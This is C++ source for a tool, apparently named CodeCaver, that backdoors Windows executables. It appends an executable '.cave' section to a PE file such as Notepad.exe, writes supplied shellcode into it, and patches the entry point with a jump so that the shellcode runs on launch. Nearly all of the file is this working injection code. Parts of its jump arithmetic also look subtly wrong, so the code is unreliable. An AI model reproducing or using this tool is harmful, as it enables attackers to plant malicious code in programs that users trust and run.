#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <fstream>
#include <vector>
#include <iostream>
#include <filesystem>

// http://www.rohitab.com/discuss/topic/41466-add-a-new-pe-section-code-inside-of-it/
DWORD align(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;
	return addr + (size / align + 1) * align;
}

BOOL InsertSection(const char* path, std::vector<unsigned char> buffer, UINT32 shellSize)
{
	HANDLE file = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open file\n");
		return FALSE;
	}

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer.data();
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("[-] Invalid PE\n");
		return FALSE;
	}

	PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)(buffer.data() + dos->e_lfanew + sizeof(ULONG));
	PIMAGE_OPTIONAL_HEADER64 optionalHeader = (PIMAGE_OPTIONAL_HEADER64)(buffer.data() + dos->e_lfanew + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(buffer.data() + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
	printf("%x\n", sectionHeader->Characteristics);

	ZeroMemory(&sectionHeader[fileHeader->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
	CopyMemory(&sectionHeader[fileHeader->NumberOfSections].Name, ".cave", 8);
	//We use 8 bytes for section name,cause it is the maximum allowed section name size

	//lets insert all the required information about our new PE section
	sectionHeader[fileHeader->NumberOfSections].Misc.VirtualSize = align(shellSize, optionalHeader->SectionAlignment, 0);
	sectionHeader[fileHeader->NumberOfSections].VirtualAddress = align(sectionHeader[fileHeader->NumberOfSections - 1].Misc.VirtualSize, optionalHeader->SectionAlignment, sectionHeader[fileHeader->NumberOfSections - 1].VirtualAddress);
	sectionHeader[fileHeader->NumberOfSections].SizeOfRawData = align(shellSize, optionalHeader->FileAlignment, 0);
	sectionHeader[fileHeader->NumberOfSections].PointerToRawData = align(sectionHeader[fileHeader->NumberOfSections - 1].SizeOfRawData, optionalHeader->FileAlignment, sectionHeader[fileHeader->NumberOfSections - 1].PointerToRawData);
	sectionHeader[fileHeader->NumberOfSections].Characteristics = 0xE00000E0;

	/*
		0xE00000E0 = IMAGE_SCN_MEM_WRITE |
					 IMAGE_SCN_CNT_CODE  |
					 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
					 IMAGE_SCN_MEM_EXECUTE |
					 IMAGE_SCN_CNT_INITIALIZED_DATA |
					 IMAGE_SCN_MEM_READ
	*/
	SetFilePointer(file, sectionHeader[fileHeader->NumberOfSections].PointerToRawData + sectionHeader[fileHeader->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	//end the file right here,on the last section + it's own size
	SetEndOfFile(file);
	//now lets change the size of the image,to correspond to our modifications
	//by adding a new section,the image size is bigger now
	optionalHeader->SizeOfImage = sectionHeader[fileHeader->NumberOfSections].VirtualAddress + sectionHeader[fileHeader->NumberOfSections].Misc.VirtualSize;
	//and we added a new section,so we change the NOS too
	fileHeader->NumberOfSections += 1;
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	//and finaly,we add all the modifications to the file
	DWORD dw;
	WriteFile(file, buffer.data(), buffer.size(), &dw, NULL);
	CloseHandle(file);

	return TRUE;
}

BOOL InjectShellcode(const char* path, std::vector<unsigned char> buffer)
{
	HANDLE file = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return false;
	DWORD filesize = GetFileSize(file, NULL);
	BYTE* pByte = new BYTE[filesize];
	DWORD dw;
	ReadFile(file, pByte, filesize, &dw, NULL);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);

	//since we added a new section,it must be the last section added,cause of the code inside
	//AddSection function,thus we must get to the last section to insert our secret data :)
	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

	SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);

	WriteFile(file, buffer.data(), buffer.size(), &dw, 0);
	CloseHandle(file);
	return TRUE;
}

BOOL PatchInstruction(const char* path)
{
	// Open the file
	std::ifstream file(path, std::ios::binary);
	if (!file.is_open()) {
		std::cerr << "Could not open file: " << path << std::endl;
		return FALSE;
	}

	// Get the file size
	file.seekg(0, std::ios::end);
	size_t fileSize = file.tellg();
	file.seekg(0, std::ios::beg);

	// Read the file into a buffer
	char* buffer = new char[fileSize];
	file.read(buffer, fileSize);

	// Get the DOS header
	PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer);
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cerr << "Invalid DOS signature." << std::endl;
		return FALSE;
	}

	// Get the NT headers
	PIMAGE_NT_HEADERS64 ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		std::cerr << "Invalid NT signature." << std::endl;
		return FALSE;
	}

	// Get the section headers
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);

	// Find the .cave section
	PIMAGE_SECTION_HEADER caveSectionHeader = nullptr;
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		if (strncmp(reinterpret_cast<char*>(sectionHeader[i].Name), ".cave", IMAGE_SIZEOF_SHORT_NAME) == 0) {
			caveSectionHeader = &sectionHeader[i];
			break;
		}
	}

	if (caveSectionHeader == nullptr) {
		std::cerr << "Could not find .cave section." << std::endl;
		return FALSE;
	}

	// Get the RVA of the entry point
	DWORD entryPointRva = ntHeader->OptionalHeader.AddressOfEntryPoint;
	printf("[+] Entry point: 0x%x\n", entryPointRva);

	// Calculate the file offset of the entry point
	DWORD entryPointOffset = 0;
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		if (entryPointRva >= sectionHeader[i].VirtualAddress &&
			entryPointRva < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
			entryPointOffset = sectionHeader[i].PointerToRawData + (entryPointRva - sectionHeader[i].VirtualAddress);
			break;
		}
	}

	if (entryPointOffset == 0) {
		std::cerr << "Could not find file offset of entry point." << std::endl;
		return FALSE;
	}

	// Calculate the address of the jump target
	DWORD jumpTargetAddress = ntHeader->OptionalHeader.ImageBase + caveSectionHeader->VirtualAddress;
	DWORD jumpOffset = jumpTargetAddress - (ntHeader->OptionalHeader.ImageBase + entryPointRva + sizeof(5));

	// Patch the entry point with a jump instruction to the .cave section
	unsigned char bytes[5];
	bytes[0] = (jumpOffset & 0xFF000000) >> 24;
	bytes[1] = (jumpOffset & 0x00FF0000) >> 16;
	bytes[2] = (jumpOffset & 0x0000FF00) >> 8;
	bytes[3] = jumpOffset & 0x000000FF;
	bytes[4] = 0xE9;

	std::reverse(bytes, bytes + sizeof(bytes));

	printf("[+] Patch shellcode: ");
	for (int i = 0; i < sizeof(bytes); i++)
		printf("0x%x ", bytes[i]);
	printf("\n");

	memcpy(buffer + entryPointOffset, bytes, sizeof(bytes));
	memcpy(buffer + entryPointOffset + sizeof(bytes), &jumpOffset, sizeof(jumpOffset));

	std::cout << "[+] Patched entrypoint" << std::endl;

	// Save the patched file to disk
	std::ofstream outputFile("patched.exe", std::ios::binary);
	if (!outputFile.is_open()) {
		std::cerr << "Could not create output file." << std::endl;
		return FALSE;
	}
	outputFile.write(buffer, fileSize);

	// Cleanup
	delete[] buffer;

	std::cout << "[+] Patched file saved to 'patched.exe'" << std::endl;

	return TRUE;
}

VOID Helper()
{
	printf("\n");
	printf("Usage:\n");
	printf("CodeCaver.exe executable shellcode\n\n");
	printf("Example:\n");
	printf("CodeCaver.exe C:\\Notepad.exe C:\\Users\\user\\shellcode.bin\n\n");
}

int main(int argc, char* argv[])
{
	if (argc < 3)
	{
		printf("[-] Invalid paramters\n");
		Helper();
		return -1;
	}

	const char* exePath = argv[1];
	const char* shellPath = argv[2];

	std::ifstream exe(exePath, std::ios::binary);
	std::vector<unsigned char> exeBuffer(std::istreambuf_iterator<char>(exe), {});
	exe.close();

	std::ifstream shell(shellPath, std::ios::binary);
	std::vector<unsigned char> shellBuffer(std::istreambuf_iterator<char>(shell), {});
	shell.close();

	printf("[+] Exe size: %d\n", exeBuffer.size());
	printf("[+] Shellcode size: %d\n", shellBuffer.size());

	if (!InsertSection(exePath, exeBuffer, shellBuffer.size()))
		return -1;

	if (!InjectShellcode(exePath, shellBuffer))
		return -1;

	if (!PatchInstruction(exePath))
		return -1;

	printf("[+] Success!\n");
}